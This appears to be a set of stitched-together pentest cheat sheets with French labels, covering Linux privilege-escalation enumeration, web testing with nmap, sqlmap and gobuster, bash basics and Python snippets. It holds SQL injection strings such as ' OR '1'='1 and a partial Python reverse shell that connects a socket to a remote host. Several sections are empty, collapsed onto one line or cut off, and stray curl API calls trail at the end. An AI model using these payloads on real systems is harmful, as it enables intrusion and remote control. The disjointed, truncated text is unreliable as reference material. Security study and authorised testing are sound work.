description: Guide complet de l'escalade de privilèges sous Linux
contenu:
# Privilege Escalation Linux

## 1. Information Gathering
uname -a
id
sudo -l
cat /etc/sudoers
find / -perm -4000 -ls 2>/dev/null

## 2. SUID Binaries
find / -type f -perm -u=s 2>/dev/null
strings /usr/bin/something
strace -e trace=execve /usr/bin/something

## 3. Kernel Exploits
uname -r
cat /proc/version

## 4. Sudo Exploitation
sudo -l
sudo -u user command

## 5. NOPASSWD Exploitation
grep -r NOPASSWD /etc/sudoers

## 6. Path Exploitation
echo $PATH
ls -la /usr/local/bin

## 7. Weak File Permissions
find / -type f -perm 0777 2>/dev/null
find / -type d -perm 0777 2>/dev/null

## 8. Cron Jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

description: Cheat sheet pour les tests de pénétration web
contenu: # Web Penetration Testing ## OWASP Top 10 ### 1. Reconnaissance whois domain.com nmap -sV -sC domain.com whatweb domain.com ### 2. SQL Injection sqlmap -u "http://site.com/page?id=1" --dbs ' OR '1'='1 admin' OR '1'='1' -- ### 3. XSS Testing ### 4. CSRF Testing ### 5. Directory Enumeration gobuster dir -u http://site.com -w wordlist.txt ffuf -u http://site.com/FUZZ -w wordlist.txt ### 6. Authentication Bypass default credentials token manipulation ### 7. File Upload multiple extensions magic bytes bypass ### 8. Security Headers curl -I http://site.com X-Frame-Options Content-Security-Policy

# Bash Scripting

## Variables
VAR="value"
echo $VAR
readonly VAR
unset VAR

## Paramètres
$0 - nom du script
$1, $2, etc - arguments
$# - nombre d'arguments
$@ - tous les arguments
$? - code de retour

## Boucles
for i in {1..10}; do echo $i; done
for file in *.txt; do cat $file; done
while [ condition ]; do command; done

## Conditions
if [ $var -eq 5 ]; then
  echo "Equal"
fi
[ -f file ] - fichier existe
[ -d dir ] - répertoire existe

## Fonctions
function_name() {
  echo "Hello"
  return 0
}

## Redirections
command > file
command >> file
command < file
command 2>&1

# Python for Pentesting

## HTTP Requests
import requests
r = requests.get(url)
r.status_code
r.text

## Port Scanner
for port in range(1, 1024):
    sock = socket.socket()
    result = sock.connect_ex((host, port))
    if result == 0:
        print(f'Port {port} is open')

## Subprocess
import subprocess
result = subprocess.run(['ls', '-la'])

## File Operations
with open('file.txt', 'r') as f:
    content = f.read()

## Base64

encoded = base64.b64encode(b'data')

## Reverse Shell

s=socket.socket()
s.connect(('ip',port))
os.dup2(s.fileno(),0)

curl -X PUT http://api.example.com/users/1
curl -X DELETE http://api.example.com/users/1
curl -X PATCH http://api.example.com/users/1

curl http://api.example.com/users/2
